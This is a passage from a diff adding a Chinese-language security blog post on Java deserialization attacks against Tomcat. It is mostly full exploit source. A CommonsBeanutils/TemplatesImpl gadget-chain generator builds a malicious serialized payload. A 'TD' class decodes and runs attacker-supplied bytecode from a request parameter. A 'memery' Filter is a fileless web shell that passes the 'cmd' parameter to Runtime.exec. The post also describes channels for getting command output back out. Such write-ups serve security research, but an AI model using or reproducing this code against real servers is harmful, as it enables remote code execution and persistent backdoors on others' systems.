+            <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+
+            <span class="n">CtClass</span> <span class="n">ctClass2</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;deserialize.cmd&#34;</span><span class="o">);</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes2</span> <span class="o">=</span> <span class="n">ctClass2</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;post请求参数wangdefu\\n&#34;</span> <span class="o">+</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">classBytes2</span><span class="o">));</span>
+
+            <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">setField</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_name&#34;</span><span class="o">,</span> <span class="s">&#34;name&#34;</span><span class="o">);</span>
+            <span class="n">setField</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_bytecodes&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">classBytes</span><span class="o">});</span>
+            <span class="n">setField</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_tfactory&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
+            <span class="n">setField</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">&#34;_class&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+            <span class="n">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="o">(</span><span class="s">&#34;outputProperties&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">CASE_INSENSITIVE_ORDER</span><span class="o">);</span>
+
+            <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">(</span><span class="n">2</span><span class="o">,</span> <span class="n">beanComparator</span><span class="o">);</span>
+
+            <span class="n">setField</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">,</span> <span class="n">templates</span><span class="o">});</span>
+            <span class="n">setField</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;size&#34;</span><span class="o">,</span> <span class="n">2</span><span class="o">);</span>
+
+            <span class="n">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;./CommonsBeanutils.ser&#34;</span><span class="o">));</span>
+            <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
+            <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+            <span class="n">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;./CommonsBeanutils.ser&#34;</span><span class="o">));</span>
+            <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="n">inputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">f0</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>
+        <span class="n">f0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">f0</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><img src="/images/image-20211031170958.png" alt=""></p>
+</li>
+<li>
+<p>通过RMI绑定实例获取回显（有点鸡肋，需要在目标开RMI服务，在远程连接，如果内网机器做了反代就没法用）
+通过defineClass定义的恶意命令执行字节码来绑定RMI实例，接着通过RMI调用绑定的实例拿到回显结果。<a href="https://xz.aliyun.com/t/7228#toc-5" target="_blank" rel="noopener">Weblogic使用ClassLoader和RMI来回显命令执行结果</a></p>
+</li>
+<li>
+<p>URLClassLoader抛出异常
+通过将回显结果封装到异常信息抛出拿到回显。参考<a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">Java 反序列化回显的多种姿势</a></p>
+</li>
+<li>
+<p>dnslog或如果知道web路径可以写文件</p>
+</li>
+</ol>
+<h2 id="反序列化注入内存马"><a href="#反序列化注入内存马" class="anchor-link">#</a><a href="#contents:反序列化注入内存马" class="headings">反序列化注入内存马</a></h2>
+<p>Tomcat7 Filter内存马（Tomcat 8、9 需要改一下FilterMap和FilterDef的包名）</p>
+<p>maven 导一下包（以免本地报错）</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">catalina</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">7</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">109</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">coyote</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">7</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">109</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>TD类代码实现</strong></p>
+<p>和回显部分代码相同。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Iterator</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TD</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="c1">//System.out.println(&#34;aaaa&#34;);
+</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">GetAcceptorThread</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;global&#34;</span><span class="o">),</span> <span class="s">&#34;processors&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">&#34;req&#34;</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverPort&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">).</span><span class="na">getNote</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Response</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getResponse</span><span class="o">();</span>
+                <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;wangdefu&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">code</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">code</span><span class="o">);</span>
+                        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">});</span>
+                        <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                        <span class="n">Class</span> <span class="n">cc</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">TD</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">classBytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">classBytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+                        <span class="n">cc</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">});</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
+        <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+        <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+
+                <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+                <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="o">}</span>
+            <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">GetAcceptorThread</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="n">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">&#34;threads&#34;</span><span class="o">);</span>
+        <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">continue</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Acceptor&#34;</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;target&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">Object</span> <span class="n">target2</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                        <span class="n">target</span> <span class="o">=</span> <span class="n">thread</span><span class="o">;</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">continue</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+                <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">try</span> <span class="o">{</span>
+                        <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;endpoint&#34;</span><span class="o">);</span>
+                    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">continue</span><span class="o">;</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+                <span class="k">return</span> <span class="n">jioEndPoint</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p><strong>memery类代码实现</strong></p>
+<p>和上面回显的cmd类差不多，只是换成了注册filter。注意，不能将注入的filter写成内部类或者匿名内部类，<code>CtClass ctClass2 = pool.get(&quot;deserialize.memery&quot;);</code> 是不会获取到它的内部类的，所以这里直接让memery类实现Filter接口，成为Filter类。在服务器端会报找不到该内部类。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">deserialize</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.catalina.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.ApplicationContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.ApplicationFilterConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.deploy.FilterDef</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.deploy.FilterMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">memery</span> <span class="kd">implements</span> <span class="n">Filter</span><span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+        <span class="n">HttpServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">servletRequest</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">&#34;text/html;charset=utf-8&#34;</span><span class="o">);</span>
+                <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)).</span><span class="na">getInputStream</span><span class="o">();</span>
